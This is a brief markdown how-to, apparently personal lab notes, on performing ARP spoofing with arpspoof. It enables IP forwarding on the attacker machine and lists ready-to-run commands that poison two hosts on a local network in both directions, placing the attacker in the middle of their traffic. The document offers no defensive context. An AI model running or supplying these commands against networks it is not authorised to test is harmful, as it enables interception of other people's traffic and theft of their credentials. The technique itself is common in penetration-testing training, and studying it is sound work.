# Performing ARP Spoofing with arpspoof

## Activating IP Forwarding on Attacker Machine
echo 1 > /proc/sys/net/ipv4/ip_forward

## Running arpspoof 
- Syntax
```
arpspoof -i <interface> -t <target_ip> <victim_ip>
```
- Execution Commands
```
arpspoof -i eth0 -t 192.168.4.151 192.168.4.199
arpspoof -i eth0 -t 192.168.4.199 192.168.4.151
```